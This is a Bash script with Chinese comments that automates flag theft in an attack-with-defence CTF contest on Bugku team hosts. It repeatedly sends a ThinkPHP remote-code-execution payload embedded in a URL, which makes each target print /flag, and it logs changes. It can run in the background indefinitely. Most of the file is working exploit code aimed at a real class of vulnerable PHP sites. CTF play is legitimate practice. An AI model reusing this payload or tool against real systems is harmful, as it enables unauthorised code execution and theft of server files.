#!/bin/bash
#=======================================================================
# awd_flag_poller.sh - 持续轮询已拿下目标的 flag, 检测变化并记录
#
# 用法:
#   bash awd_flag_poller.sh --template "192-168-1-{TEAM}.pvp7574.bugku.cn" --teams 2,26,117
#   bash awd_flag_poller.sh --help
#
# 功能:
#   - 对每个目标用 ThinkPHP RCE payload 读取 /flag
#   - 检测 flag 是否变化 (比赛 flag 会周期性刷新)
#   - 变化时写日志: logs/flags/flag_changes.log
#   - 默认每 60 秒轮询一轮
# 后台运行:  nohup bash awd_flag_poller.sh ... > /dev/null 2>&1 &
#=======================================================================

set -u

# ----- 默认参数 -----
TEMPLATE=""
TEAMS=""
INTERVAL=60
TIMEOUT=8
LOG_DIR="logs/flags"
CHANGE_LOG="$LOG_DIR/flag_changes.log"

# ----- 解析参数 -----
declare -a TARGETS=()      # 实际 host 数组
declare -a LAST_FLAGS=()   # 上次 flag 快照

usage() {
    echo "用法: bash awd_flag_poller.sh --template <域名模板> --teams <2,26,117> [--interval 60]"
    echo "  域名模板: 含 {TEAM}, 例 192-168-1-{TEAM}.pvp7574.bugku.cn"
    echo "  例: bash awd_flag_poller.sh --template '192-168-1-{TEAM}.pvp7574.bugku.cn' --teams 2,26,117"
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --template) TEMPLATE="$2"; shift 2 ;;
        --teams)    TEAMS="$2";   shift 2 ;;
        --interval) INTERVAL="$2"; shift 2 ;;
        --timeout)  TIMEOUT="$2"; shift 2 ;;
        --help|-h)  usage ;;
        *) echo "未知参数: $1"; usage ;;
    esac
done

if [[ -z "$TEMPLATE" || -z "$TEAMS" ]]; then
    echo "[!] 必须指定 --template 和 --teams"
    usage
fi

# ----- 构建目标列表 -----
IFS=',' read -r -a TEAM_IDS <<< "$TEAMS"
for t in "${TEAM_IDS[@]}"; do
    HOST="${TEMPLATE//\{TEAM\}/$t}"
    TARGETS+=("$HOST")
    LAST_FLAGS+=("")
done

mkdir -p "$LOG_DIR"

poll_one() {
    local host="$1"
    local idx="$2"
    # TP RCE 读取 flag (兼容方式)
    local url="http://${host}/index.php?s=/Index/index/name/\${@print(file_get_contents('/flag'))}"
    local html
    html=$(timeout "$TIMEOUT" curl -sk "${url}" 2>/dev/null || echo "")
    local flag
    flag=$(echo "$html" | grep -oE 'flag\{[^}]+\}' | head -1)
    echo "$flag"
}

echo "[$(date '+%T')] Flag 轮询启动: ${#TARGETS[@]} 个目标, 每 ${INTERVAL}s"
echo "[$(date '+%T')]   ${TARGETS[*]}"

while true; do
    TS="$(date '+%m-%d %H:%M:%S')"
    for i in "${!TARGETS[@]}"; do
        host="${TARGETS[$i]}"
        flag=$(poll_one "$host" "$i")
        if [[ -z "$flag" ]]; then
            printf "[%s] %-42s 获取失败/目标未命中\n" "$TS" "$host"
        elif [[ "$flag" != "${LAST_FLAGS[$i]}" ]]; then
            printf "[%s] %-42s [变更] %s\n" "$TS" "$host" "$flag"
            if [[ -n "${LAST_FLAGS[$i]}" ]]; then
                echo "$TS  $host  ${LAST_FLAGS[$i]}  -->  $flag" >> "$CHANGE_LOG"
            fi
            LAST_FLAGS[$i]="$flag"
        else
            printf "[%s] %-42s %s (不变)\n" "$TS" "$host" "$flag"
        fi
    done
    echo "---"
    sleep "$INTERVAL"
done
